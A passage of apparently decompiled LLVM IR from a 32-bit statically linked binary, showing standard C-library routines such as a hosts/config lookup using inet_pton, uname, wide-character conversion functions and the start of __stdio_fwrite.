  %v2_804f979 = inttoptr i32 %v1_804f979 to i32*
  store i32 48, i32* %v2_804f979, align 4
  %v0_804f980 = load i32, i32* @ebx, align 4
  %v1_804f980 = add i32 %v0_804f980, -48
  store i32 %v1_804f980, i32* %eax.global-to-local, align 4
  %v1_804f983 = load i32, i32* @edi, align 4
  %v2_804f983 = add i32 %v1_804f983, 16
  %v3_804f983 = inttoptr i32 %v2_804f983 to i32*
  store i32 %v1_804f980, i32* %v3_804f983, align 4
  %v0_804f986 = load i32, i32* @esi, align 4
  %v1_804f986 = inttoptr i32 %v0_804f986 to i32*
  store i32 1, i32* %v1_804f986, align 4
  %v0_804f994 = load i32, i32* %edx.global-to-local, align 4
  %v1_804f994 = add i32 %v0_804f994, 24
  store i32 %v1_804f994, i32* %edx.global-to-local, align 4
  store i32 %v1_804f994, i32* %stack_var_-28, align 4
  %v2_804fa92 = ptrtoint i32* %stack_var_-20 to i32
  %v12_804f9a9 = icmp eq i32 %arg4, 1
  %v12_804f9b6 = icmp eq i32 %arg4, 2
  %v3_804f9dd = inttoptr i32 %arg2 to i8*
  %v1_804fa12 = add i32 %arg6, 32
  %v2_804fa19 = add i32 %arg6, 24
  %v3_804fa19 = inttoptr i32 %v2_804fa19 to i32*
  %v12_804fa1c = icmp eq i32 %arg3, 2
  %v12_804fa4e = icmp eq i32 %arg3, 10
  %v1_804f9bb = icmp eq i1 %v12_804f9b6, false
  %v1_804fa21 = icmp eq i1 %v12_804fa1c, false
  %v1_804fa53 = icmp eq i1 %v12_804fa4e, false
  br label %dec_label_pc_804fa88.outer

dec_label_pc_804fa88.outer:                       ; preds = %dec_label_pc_804fa23, %dec_label_pc_804fa4e, %dec_label_pc_804fa55, %dec_label_pc_804f972
  %stack_var_-24.0.ph = phi i32 [ 1, %dec_label_pc_804f972 ], [ 2, %dec_label_pc_804fa55 ], [ 2, %dec_label_pc_804fa4e ], [ 2, %dec_label_pc_804fa23 ]
  br label %dec_label_pc_804fa88

dec_label_pc_804f99f:                             ; preds = %dec_label_pc_804fa88
  %v3_804f99f = load i32, i32* %stack_var_-20, align 4
  %v1_804f9a3 = add i32 %v3_804f99f, 4
  store i32 %v1_804f9a3, i32* @esi, align 4
  %v1_804f9a6 = load i32, i32* @ebp, align 4
  %v2_804f9a6 = add i32 %v1_804f9a6, 4
  %v3_804f9a6 = inttoptr i32 %v2_804f9a6 to i32*
  store i32 %v1_804f9a3, i32* %v3_804f9a6, align 4
  br i1 %v12_804f9a9, label %dec_label_pc_804fac2, label %dec_label_pc_804f9b4

dec_label_pc_804f9b4:                             ; preds = %dec_label_pc_804f99f
  %v0_804f9b4 = load i32, i32* @esi, align 4
  store i32 %v0_804f9b4, i32* @ebx, align 4
  br i1 %v1_804f9bb, label %dec_label_pc_804f9eb.preheader, label %dec_label_pc_804f9bd

dec_label_pc_804f9eb.preheader:                   ; preds = %dec_label_pc_804f9b4
  %v1_804f9eb20 = inttoptr i32 %v0_804f9b4 to i32*
  %v2_804f9eb21 = load i32, i32* %v1_804f9eb20, align 4
  store i32 %v2_804f9eb21, i32* %eax.global-to-local, align 4
  %v1_804f9ed22 = icmp eq i32 %v2_804f9eb21, 0
  %v1_804f9ef29 = icmp eq i1 %v1_804f9ed22, false
  br i1 %v1_804f9ef29, label %dec_label_pc_804f9d8.lr.ph, label %dec_label_pc_804fa88

dec_label_pc_804f9d8.lr.ph:                       ; preds = %dec_label_pc_804f9eb.preheader
  br label %dec_label_pc_804f9d8

dec_label_pc_804f9bd:                             ; preds = %dec_label_pc_804f9b4
  %v3_804f9bd = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_804f9bd, i32* @eax, align 4
  %v1_804f9c1 = inttoptr i32 %v3_804f9bd to i32*
  %v2_804f9c1 = load i32, i32* %v1_804f9c1, align 4
  %v4_804f9c7 = call i32 @__GI_strcoll(i8* %v3_804f9dd, i32 %v2_804f9c1)
  store i32 %v4_804f9c7, i32* %eax.global-to-local, align 4
  store i32 %arg2, i32* @ebx, align 4
  store i32 %v2_804f9c1, i32* %edx.global-to-local, align 4
  %v1_804f9ce = icmp eq i32 %v4_804f9c7, 0
  %v1_804f9d0 = icmp eq i1 %v1_804f9ce, false
  br i1 %v1_804f9d0, label %dec_label_pc_804fa88, label %dec_label_pc_804f9f6

dec_label_pc_804f9d8:                             ; preds = %dec_label_pc_804f9d8.lr.ph, %dec_label_pc_804f9e8
  %v2_804f9eb30 = phi i32 [ %v2_804f9eb21, %dec_label_pc_804f9d8.lr.ph ], [ %v2_804f9eb, %dec_label_pc_804f9e8 ]
  %v4_804f9dd = call i32 @__GI_strcasecmp(i8* %v3_804f9dd, i32 %v2_804f9eb30)
  store i32 %v4_804f9dd, i32* %eax.global-to-local, align 4
  store i32 %arg2, i32* %edx.global-to-local, align 4
  %v1_804f9e4 = icmp eq i32 %v4_804f9dd, 0
  br i1 %v1_804f9e4, label %dec_label_pc_804f9f6, label %dec_label_pc_804f9e8

dec_label_pc_804f9e8:                             ; preds = %dec_label_pc_804f9d8
  %v0_804f9e8 = load i32, i32* @ebx, align 4
  %v1_804f9e8 = add i32 %v0_804f9e8, 4
  store i32 %v1_804f9e8, i32* @ebx, align 4
  %v1_804f9eb = inttoptr i32 %v1_804f9e8 to i32*
  %v2_804f9eb = load i32, i32* %v1_804f9eb, align 4
  store i32 %v2_804f9eb, i32* %eax.global-to-local, align 4
  %v1_804f9ed = icmp eq i32 %v2_804f9eb, 0
  %v1_804f9ef = icmp eq i1 %v1_804f9ed, false
  br i1 %v1_804f9ef, label %dec_label_pc_804f9d8, label %dec_label_pc_804fa88

dec_label_pc_804f9f6:                             ; preds = %dec_label_pc_804f9bd, %dec_label_pc_804f9d8
  %v0_804f9f6 = load i32, i32* @esi, align 4
  %v1_804f9f6 = inttoptr i32 %v0_804f9f6 to i32*
  %v2_804f9f6 = load i32, i32* %v1_804f9f6, align 4
  %v1_804f9f8 = load i32, i32* @ebp, align 4
  %v2_804f9f8 = inttoptr i32 %v1_804f9f8 to i32*
  store i32 %v2_804f9f6, i32* %v2_804f9f8, align 4
  %v0_804f9fb = load i32, i32* @esi, align 4
  %v1_804f9fb = add i32 %v0_804f9fb, 4
  %v1_804f9fe = load i32, i32* @ebp, align 4
  %v2_804f9fe = add i32 %v1_804f9fe, 4
  %v3_804f9fe = inttoptr i32 %v2_804f9fe to i32*
  store i32 %v1_804f9fb, i32* %v3_804f9fe, align 4
  %v2_804fa01 = load i32, i32* %stack_var_-28, align 4
  store i32 %v2_804fa01, i32* %eax.global-to-local, align 4
  %v1_804fa04 = load i32, i32* @ebp, align 4
  %v2_804fa04 = add i32 %v1_804fa04, 16
  %v3_804fa04 = inttoptr i32 %v2_804fa04 to i32*
  store i32 %v2_804fa01, i32* %v3_804fa04, align 4
  %v0_804fa07 = load i32, i32* %eax.global-to-local, align 4
  %v1_804fa07 = add i32 %v0_804fa07, 4
  %v2_804fa07 = inttoptr i32 %v1_804fa07 to i32*
  store i32 0, i32* %v2_804fa07, align 4
  store i32 %v1_804fa12, i32* %eax.global-to-local, align 4
  store i32 %arg6, i32* %edx.global-to-local, align 4
  store i32 %v1_804fa12, i32* %v3_804fa19, align 4
  br i1 %v1_804fa21, label %dec_label_pc_804fa4e, label %dec_label_pc_804fa23

dec_label_pc_804fa23:                             ; preds = %dec_label_pc_804f9f6
  %v3_804fa24 = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_804fa24, i32* %eax.global-to-local, align 4
  %v1_804fa28 = inttoptr i32 %v3_804fa24 to i32*
  %v2_804fa28 = load i32, i32* %v1_804fa28, align 4
  %v4_804fa2c = inttoptr i32 %v2_804fa28 to i8*
  %v5_804fa2c = call i32 @inet_pton(i32 2, i8* %v4_804fa2c)
  store i32 %v5_804fa2c, i32* %eax.global-to-local, align 4
  %tmp57 = icmp slt i32 %v5_804fa2c, 1
  br i1 %tmp57, label %dec_label_pc_804fa88.outer, label %dec_label_pc_804fa38

dec_label_pc_804fa38:                             ; preds = %dec_label_pc_804fa23
  %v0_804fa38 = load i32, i32* @ebp, align 4
  %v1_804fa38 = add i32 %v0_804fa38, 8
  %v2_804fa38 = inttoptr i32 %v1_804fa38 to i32*
  store i32 2, i32* %v2_804fa38, align 4
  %v0_804fa3f = load i32, i32* @ebp, align 4
  %v1_804fa3f = add i32 %v0_804fa3f, 12
  %v2_804fa3f = inttoptr i32 %v1_804fa3f to i32*
  store i32 4, i32* %v2_804fa3f, align 4
  store i32 %arg8, i32* @eax, align 4
  %v0_804fa4a = load i32, i32* @ebp, align 4
  %v2_804fa4a = inttoptr i32 %arg8 to i32*
  store i32 %v0_804fa4a, i32* %v2_804fa4a, align 4
  br label %dec_label_pc_804faaf

dec_label_pc_804fa4e:                             ; preds = %dec_label_pc_804f9f6
  br i1 %v1_804fa53, label %dec_label_pc_804fa88.outer, label %dec_label_pc_804fa55

dec_label_pc_804fa55:                             ; preds = %dec_label_pc_804fa4e
  %v3_804fa56 = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_804fa56, i32* %eax.global-to-local, align 4
  %v1_804fa5a = inttoptr i32 %v3_804fa56 to i32*
  %v2_804fa5a = load i32, i32* %v1_804fa5a, align 4
  %v4_804fa5e = inttoptr i32 %v2_804fa5a to i8*
  %v5_804fa5e = call i32 @inet_pton(i32 10, i8* %v4_804fa5e)
  store i32 %v5_804fa5e, i32* @eax, align 4
  %tmp58 = icmp slt i32 %v5_804fa5e, 1
  br i1 %tmp58, label %dec_label_pc_804fa88.outer, label %dec_label_pc_804fa6a

dec_label_pc_804fa6a:                             ; preds = %dec_label_pc_804fa55
  %v0_804fa6a = load i32, i32* @ebp, align 4
  %v1_804fa6a = add i32 %v0_804fa6a, 8
  %v2_804fa6a = inttoptr i32 %v1_804fa6a to i32*
  store i32 10, i32* %v2_804fa6a, align 4
  %v0_804fa71 = load i32, i32* @ebp, align 4
  %v1_804fa71 = add i32 %v0_804fa71, 12
  %v2_804fa71 = inttoptr i32 %v1_804fa71 to i32*
  store i32 16, i32* %v2_804fa71, align 4
  store i32 %arg8, i32* %edx.global-to-local, align 4
  %v0_804fa7c = load i32, i32* @ebp, align 4
  %v2_804fa7c = inttoptr i32 %arg8 to i32*
  store i32 %v0_804fa7c, i32* %v2_804fa7c, align 4
  br label %dec_label_pc_804faaf

dec_label_pc_804fa88:                             ; preds = %dec_label_pc_804f9e8, %dec_label_pc_804f9eb.preheader, %dec_label_pc_804f9bd, %dec_label_pc_804fa88.outer
  store i32 %v2_804fa92, i32* %eax.global-to-local, align 4
  %v0_804fa97 = load i32, i32* @edi, align 4
  %v5_804fa98 = inttoptr i32 %v0_804fa97 to i32*
  %v6_804fa98 = call i32 @__GI_config_read(i32* %v5_804fa98, i32 %v2_804fa92, i32 459270, i32 ptrtoint ([4 x i8]* @global_var_8051f31.141 to i32))
  store i32 %v6_804fa98, i32* @eax, align 4
  %v1_804faa0 = icmp eq i32 %v6_804fa98, 0
  %v1_804faa2 = icmp eq i1 %v1_804faa0, false
  br i1 %v1_804faa2, label %dec_label_pc_804f99f, label %dec_label_pc_804faa8

dec_label_pc_804faa8:                             ; preds = %dec_label_pc_804fa88
  br i1 %v12_804f9a9, label %dec_label_pc_804fac2, label %dec_label_pc_804faaf

dec_label_pc_804faaf:                             ; preds = %dec_label_pc_804fa38, %dec_label_pc_804fa6a, %dec_label_pc_804faa8
  %stack_var_-24.1 = phi i32 [ %stack_var_-24.0.ph, %dec_label_pc_804faa8 ], [ 0, %dec_label_pc_804fa6a ], [ 0, %dec_label_pc_804fa38 ]
  %v0_804faaf = load i32, i32* @edi, align 4
  %tmp59 = inttoptr i32 %v0_804faaf to i32*
  %v3_804fab0 = call i32 @__GI_config_close(i32* %tmp59)
  store i32 %v3_804fab0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804fac2

dec_label_pc_804fac2:                             ; preds = %dec_label_pc_804f99f, %dec_label_pc_804faa8, %entry, %dec_label_pc_804faaf, %dec_label_pc_804f958
  %stack_var_-24.2 = phi i32 [ 34, %entry ], [ %stack_var_-24.1, %dec_label_pc_804faaf ], [ %stack_var_-24.0.ph, %dec_label_pc_804faa8 ], [ %v2_804f967, %dec_label_pc_804f958 ], [ %stack_var_-24.0.ph, %dec_label_pc_804f99f ]
  store i32 %stack_var_-24.2, i32* %eax.global-to-local, align 4
  store i32 %v0_804f913, i32* @ebx, align 4
  store i32 %v0_804f912, i32* @esi, align 4
  store i32 %v0_804f911, i32* @edi, align 4
  store i32 %v0_804f910, i32* @ebp, align 4
  ret i32 %stack_var_-24.2

; uselistorder directives
  uselistorder i32 %stack_var_-24.2, { 1, 0 }
  uselistorder i32 %v2_804f9eb, { 1, 2, 0 }
  uselistorder i32 %stack_var_-24.0.ph, { 0, 2, 1 }
  uselistorder i8* %v3_804f9dd, { 1, 0 }
  uselistorder i1 %v12_804f9a9, { 1, 0 }
  uselistorder i32* %stack_var_-20, { 1, 2, 3, 4, 6, 0, 5 }
  uselistorder i32* %eax.global-to-local, { 1, 2, 12, 3, 4, 5, 6, 7, 8, 10, 9, 11, 0, 13, 14, 16, 15, 17 }
  uselistorder i32 (i32*, i32, i32, i32)* @__GI_config_read, { 2, 3, 1, 4, 0 }
  uselistorder i32 (i8*, i32)* @__GI_strcoll, { 2, 3, 4, 5, 6, 7, 8, 9, 0, 1 }
  uselistorder i32 -48, { 2, 1, 4, 5, 3, 0 }
  uselistorder i32 34, { 5, 3, 4, 8, 9, 10, 0, 13, 7, 11, 12, 6, 1, 2 }
  uselistorder i32 %arg9, { 1, 0 }
  uselistorder i32 %arg8, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %arg6, { 3, 4, 2, 1, 0 }
  uselistorder label %dec_label_pc_804fac2, { 3, 1, 0, 4, 2 }
  uselistorder label %dec_label_pc_804faaf, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804fa88, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_804f9f6, { 1, 0 }
  uselistorder label %dec_label_pc_804f9d8, { 1, 0 }
  uselistorder label %dec_label_pc_804fa88.outer, { 2, 1, 0, 3 }
}

define i32 @uname(i32 %arg1) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804fad0 = load i32, i32* @ebx, align 4
  store i32 %v0_804fad0, i32* %stack_var_-4, align 4
  %v1_804fadc = call i32 @uname(i32 %v0_804fad0)
  store i32 %v1_804fadc, i32* %ebx.global-to-local, align 4
  %tmp4 = icmp ult i32 %v1_804fadc, -4095
  br i1 %tmp4, label %dec_label_pc_804faf6, label %dec_label_pc_804faea

dec_label_pc_804faea:                             ; preds = %entry
  %v0_804faea = load i32, i32* %stack_var_-4, align 4
  %v1_804faea = call i32 @__GI___errno_location(i32 %v0_804faea)
  %v0_804faef = load i32, i32* %ebx.global-to-local, align 4
  %v1_804faef = sub i32 0, %v0_804faef
  store i32 %v1_804faef, i32* %ebx.global-to-local, align 4
  %v2_804faf1 = inttoptr i32 %v1_804faea to i32*
  store i32 %v1_804faef, i32* %v2_804faf1, align 4
  br label %dec_label_pc_804faf6

dec_label_pc_804faf6:                             ; preds = %entry, %dec_label_pc_804faea
  %v0_804faf7 = phi i32 [ %v1_804fadc, %entry ], [ -1, %dec_label_pc_804faea ]
  %v2_804faf6 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804faf6, i32* %ebx.global-to-local, align 4
  ret i32 %v0_804faf7

; uselistorder directives
  uselistorder i32 %v1_804fadc, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 (i32)* @uname, { 1, 0 }
  uselistorder label %dec_label_pc_804faf6, { 1, 0 }
}

define i32 @__GI_wcrtomb() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v1_804fb03 = icmp eq i32 %tmp5, 0
  %v1_804fb05 = icmp eq i1 %v1_804fb03, false
  br i1 %v1_804fb05, label %dec_label_pc_804fb0b, label %dec_label_pc_804fb07

dec_label_pc_804fb07:                             ; preds = %entry
  %v15_804faf8 = ptrtoint i32* %stack_var_-24 to i32
  br label %dec_label_pc_804fb0b

dec_label_pc_804fb0b:                             ; preds = %entry, %dec_label_pc_804fb07
  %v0_804fb24 = phi i32 [ %tmp5, %entry ], [ %v15_804faf8, %dec_label_pc_804fb07 ]
  %v0_804fb13 = phi i32 [ %tmp4, %entry ], [ 0, %dec_label_pc_804fb07 ]
  %v2_804fb0b = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_804fb0b, i32* %stack_var_-8, align 4
  store i32 %v0_804fb13, i32* %stack_var_-4, align 4
  %v2_804fb1f = ptrtoint i32* %stack_var_-8 to i32
  %v5_804fb25 = inttoptr i32 %v0_804fb24 to i8*
  %v6_804fb25 = call i32 @__GI_wcsnrtombs(i8* %v5_804fb25, i32 %v2_804fb1f, i32 1, i32 16, i32 %tmp)
  %v1_804fb2d = icmp eq i32 %v6_804fb25, 0
  %v1_804fb2f = icmp eq i1 %v1_804fb2d, false
  br i1 %v1_804fb2f, label %dec_label_pc_804fb33, label %dec_label_pc_804fb31

dec_label_pc_804fb31:                             ; preds = %dec_label_pc_804fb0b
  %v1_804fb31 = and i32 %v6_804fb25, -256
  %v2_804fb31 = or i32 %v1_804fb31, 1
  br label %dec_label_pc_804fb33

dec_label_pc_804fb33:                             ; preds = %dec_label_pc_804fb0b, %dec_label_pc_804fb31
  %v0_804fb36 = phi i32 [ %v6_804fb25, %dec_label_pc_804fb0b ], [ %v2_804fb31, %dec_label_pc_804fb31 ]
  ret i32 %v0_804fb36

; uselistorder directives
  uselistorder i32* %stack_var_-8, { 1, 0 }
  uselistorder label %dec_label_pc_804fb33, { 1, 0 }
  uselistorder label %dec_label_pc_804fb0b, { 1, 0 }
}

define i32 @__GI_wcsrtombs() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %v5_804fb4a = inttoptr i32 %tmp to i8*
  %v6_804fb4a = call i32 @__GI_wcsnrtombs(i8* %v5_804fb4a, i32 %tmp1, i32 -1, i32 %tmp2, i32 %tmp3)
  ret i32 %v6_804fb4a
}

define i32 @__GI_wcsnrtombs(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v0_804fb57 = load i32, i32* @ebx, align 4
  %v12_804fb58 = ptrtoint i32* %stack_var_-32 to i32
  %v4_804fb5b = ptrtoint i8* %arg1 to i32
  store i32 %v4_804fb5b, i32* %edx.global-to-local, align 4
  store i32 %arg2, i32* %ebp.global-to-local, align 4
  store i32 %arg3, i32* %ecx.global-to-local, align 4
  store i32 %arg4, i32* %eax.global-to-local, align 4
  %v1_804fb6b = icmp eq i8* %arg1, null
  br i1 %v1_804fb6b, label %dec_label_pc_804fb7f, label %dec_label_pc_804fb6f

dec_label_pc_804fb6f:                             ; preds = %entry
  store i32 1, i32* %edi.global-to-local, align 4
  %v12_804fb74 = icmp eq i32 %v4_804fb5b, %arg2
  %v1_804fb76 = icmp eq i1 %v12_804fb74, false
  br i1 %v1_804fb76, label %dec_label_pc_804fb86, label %dec_label_pc_804fb78

dec_label_pc_804fb78:                             ; preds = %dec_label_pc_804fb6f
  store i32 %v12_804fb58, i32* %edx.global-to-local, align 4
  store i32 0, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804fb86

dec_label_pc_804fb7f:                             ; preds = %entry
  store i32 %v12_804fb58, i32* %edx.global-to-local, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  store i32 0, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804fb86

dec_label_pc_804fb86:                             ; preds = %dec_label_pc_804fb6f, %dec_label_pc_804fb78, %dec_label_pc_804fb7f
  %v2_804fbac15 = phi i32 [ %v4_804fb5b, %dec_label_pc_804fb6f ], [ %v12_804fb58, %dec_label_pc_804fb78 ], [ %v12_804fb58, %dec_label_pc_804fb7f ]
  %v0_804fb86 = phi i32 [ %arg4, %dec_label_pc_804fb6f ], [ %arg4, %dec_label_pc_804fb78 ], [ -1, %dec_label_pc_804fb7f ]
  %tmp29 = icmp ugt i32 %v0_804fb86, %arg3
  br i1 %tmp29, label %dec_label_pc_804fb8c, label %dec_label_pc_804fb8e

dec_label_pc_804fb8c:                             ; preds = %dec_label_pc_804fb86
  br label %dec_label_pc_804fb8e

dec_label_pc_804fb8e:                             ; preds = %dec_label_pc_804fb86, %dec_label_pc_804fb8c
  %storemerge = phi i32 [ %arg3, %dec_label_pc_804fb8c ], [ %v0_804fb86, %dec_label_pc_804fb86 ]
  %v0_804fb91 = phi i32 [ %arg3, %dec_label_pc_804fb8c ], [ %v0_804fb86, %dec_label_pc_804fb86 ]
  store i32 %storemerge, i32* %esi.global-to-local, align 4
  %v1_804fb8e = inttoptr i32 %arg2 to i32*
  %v2_804fb8e = load i32, i32* %v1_804fb8e, align 4
  store i32 %v2_804fb8e, i32* %ecx.global-to-local, align 4
  store i32 %v0_804fb91, i32* %ebx.global-to-local, align 4
  %v1_804fbbc3 = icmp eq i32 %v0_804fb91, 0
  %v1_804fbbe10 = icmp eq i1 %v1_804fbbc3, false
  br i1 %v1_804fbbe10, label %dec_label_pc_804fb95, label %dec_label_pc_804fbc0

dec_label_pc_804fb95:                             ; preds = %dec_label_pc_804fb8e, %dec_label_pc_804fbb6
  %v2_804fbac = phi i32 [ %v2_804fbb9, %dec_label_pc_804fbb6 ], [ %v2_804fbac15, %dec_label_pc_804fb8e ]
  %v0_804fb95 = phi i32 [ %v1_804fbb6, %dec_label_pc_804fbb6 ], [ %v2_804fb8e, %dec_label_pc_804fb8e ]
  %v1_804fb95 = inttoptr i32 %v0_804fb95 to i32*
  %v2_804fb95 = load i32, i32* %v1_804fb95, align 4
  store i32 %v2_804fb95, i32* %eax.global-to-local, align 4
  %tmp30 = icmp ult i32 %v2_804fb95, 128
  br i1 %tmp30, label %dec_label_pc_804fbac, label %dec_label_pc_804fb9c

dec_label_pc_804fb9c:                             ; preds = %dec_label_pc_804fb95
  %v1_804fb9c = call i32 @__GI___errno_location(i32 %v0_804fb57)
  store i32 %v1_804fb9c, i32* %eax.global-to-local, align 4
  %v1_804fba1 = inttoptr i32 %v1_804fb9c to i32*
  store i32 84, i32* %v1_804fba1, align 4
  br label %dec_label_pc_804fbcb

dec_label_pc_804fbac:                             ; preds = %dec_label_pc_804fb95
  %v1_804fbac = trunc i32 %v2_804fb95 to i8
  %v3_804fbac = inttoptr i32 %v2_804fbac to i8*
  store i8 %v1_804fbac, i8* %v3_804fbac, align 1
  %v0_804fbae = load i32, i32* %eax.global-to-local, align 4
  %v3_804fbae = trunc i32 %v0_804fbae to i8
  %v4_804fbae = icmp eq i8 %v3_804fbae, 0
  %v1_804fbb0 = icmp eq i1 %v4_804fbae, false
  br i1 %v1_804fbb0, label %dec_label_pc_804fbb6, label %dec_label_pc_804fbb2

dec_label_pc_804fbb2:                             ; preds = %dec_label_pc_804fbac
  store i32 0, i32* %ecx.global-to-local, align 4
  %v0_804fbc0.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804fbc0

dec_label_pc_804fbb6:                             ; preds = %dec_label_pc_804fbac
  %v0_804fbb6 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804fbb6 = add i32 %v0_804fbb6, 4
  store i32 %v1_804fbb6, i32* %ecx.global-to-local, align 4
  %v0_804fbb9 = load i32, i32* %edx.global-to-local, align 4
  %v1_804fbb9 = load i32, i32* %edi.global-to-local, align 4
  %v2_804fbb9 = add i32 %v1_804fbb9, %v0_804fbb9
  store i32 %v2_804fbb9, i32* %edx.global-to-local, align 4
  %v0_804fbbb = load i32, i32* %ebx.global-to-local, align 4
  %v1_804fbbb = add i32 %v0_804fbbb, -1
  %v8_804fbbb = icmp eq i32 %v1_804fbbb, 0
  store i32 %v1_804fbbb, i32* %ebx.global-to-local, align 4
  %v1_804fbbe = icmp eq i1 %v8_804fbbb, false
  br i1 %v1_804fbbe, label %dec_label_pc_804fb95, label %dec_label_pc_804fbc0

dec_label_pc_804fbc0:                             ; preds = %dec_label_pc_804fbb6, %dec_label_pc_804fb8e, %dec_label_pc_804fbb2
  %v0_804fbc4 = phi i32 [ 0, %dec_label_pc_804fbb2 ], [ %v2_804fb8e, %dec_label_pc_804fb8e ], [ %v1_804fbb6, %dec_label_pc_804fbb6 ]
  %v0_804fbc0 = phi i32 [ %v0_804fbc0.pre, %dec_label_pc_804fbb2 ], [ %v2_804fbac15, %dec_label_pc_804fb8e ], [ %v2_804fbb9, %dec_label_pc_804fbb6 ]
  %v1_804fbc0 = load i32, i32* @esp, align 4
  %v12_804fbc0 = icmp eq i32 %v0_804fbc0, %v1_804fbc0
  br i1 %v12_804fbc0, label %dec_label_pc_804fbc7, label %dec_label_pc_804fbc4

dec_label_pc_804fbc4:                             ; preds = %dec_label_pc_804fbc0
  %v1_804fbc4 = load i32, i32* %ebp.global-to-local, align 4
  %v2_804fbc4 = inttoptr i32 %v1_804fbc4 to i32*
  store i32 %v0_804fbc4, i32* %v2_804fbc4, align 4
  br label %dec_label_pc_804fbc7

dec_label_pc_804fbc7:                             ; preds = %dec_label_pc_804fbc0, %dec_label_pc_804fbc4
  %v0_804fbc7 = load i32, i32* %esi.global-to-local, align 4
  store i32 %v0_804fbc7, i32* %eax.global-to-local, align 4
  %v1_804fbc9 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804fbc9 = sub i32 %v0_804fbc7, %v1_804fbc9
  br label %dec_label_pc_804fbcb

dec_label_pc_804fbcb:                             ; preds = %dec_label_pc_804fb9c, %dec_label_pc_804fbc7
  %storemerge1 = phi i32 [ -1, %dec_label_pc_804fb9c ], [ %v2_804fbc9, %dec_label_pc_804fbc7 ]
  store i32 %storemerge1, i32* %eax.global-to-local, align 4
  store i32 %v0_804fb57, i32* @ebx, align 4
  ret i32 %storemerge1

; uselistorder directives
  uselistorder i32 %v2_804fbb9, { 0, 2, 1 }
  uselistorder i32 %v1_804fbb6, { 0, 2, 1 }
  uselistorder i32 %v2_804fb95, { 1, 0, 2 }
  uselistorder i32 %v2_804fb8e, { 1, 0, 2 }
  uselistorder i32 %v0_804fb91, { 1, 0 }
  uselistorder i32 %v2_804fbac15, { 1, 0 }
  uselistorder i32 %v4_804fb5b, { 1, 0, 2 }
  uselistorder i32 %v12_804fb58, { 0, 1, 3, 2 }
  uselistorder i32* %esi.global-to-local, { 1, 0 }
  uselistorder i32* %edx.global-to-local, { 0, 3, 4, 1, 2, 5 }
  uselistorder i32* %edi.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %ecx.global-to-local, { 0, 2, 1, 3, 4 }
  uselistorder i32* %ebx.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %eax.global-to-local, { 1, 0, 3, 2, 4, 5, 6 }
  uselistorder i32 84, { 2, 0, 3, 4, 5, 1 }
  uselistorder i32 128, { 3, 6, 11, 0, 12, 4, 2, 14, 9, 15, 1, 7, 8, 10, 5, 13 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804fbcb, { 1, 0 }
  uselistorder label %dec_label_pc_804fbc7, { 1, 0 }
  uselistorder label %dec_label_pc_804fbc0, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804fb95, { 1, 0 }
  uselistorder label %dec_label_pc_804fb8e, { 1, 0 }
  uselistorder label %dec_label_pc_804fb86, { 2, 1, 0 }
}

define i32 @__stdio_fwrite(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ebp.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %zf.global-to-local = alloca i1, align 1
  %stack_var_-24 = alloca i8*, align 4
  %tmp26 = call i8* @__decompiler_undefined_function_4()
  store i8* %tmp26, i8** %stack_var_-24, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804fbd4 = load i32, i32* @ebp, align 4
  %v0_804fbd5 = load i32, i32* @edi, align 4
  %v0_804fbd6 = load i32, i32* @esi, align 4
  %v0_804fbd7 = load i32, i32* @ebx, align 4
  store i32 %v0_804fbd7, i32* %stack_var_-16, align 4
  store i1 false, i1* %zf.global-to-local, align 1
  %v4_804fbdb = ptrtoint i8* %arg1 to i32
  store i32 %v4_804fbdb, i32* @ebp, align 4
  store i32 %arg2, i32* @esi, align 4
  store i32 %arg3, i32* @ebx, align 4
  %v1_804fbe7 = add i32 %arg3, 1
  %v2_804fbe7 = inttoptr i32 %v1_804fbe7 to i8*
  %v3_804fbe7 = load i8, i8* %v2_804fbe7, align 1
  %v4_804fbe7 = and i8 %v3_804fbe7, 2
  %v5_804fbe7 = icmp eq i8 %v4_804fbe7, 0
  store i1 %v5_804fbe7, i1* %zf.global-to-local, align 1
  %v1_804fbeb = icmp eq i1 %v5_804fbe7, false
  br i1 %v1_804fbeb, label %dec_label_pc_804fc9c, label %dec_label_pc_804fbf1

dec_label_pc_804fbf1:                             ; preds = %entry
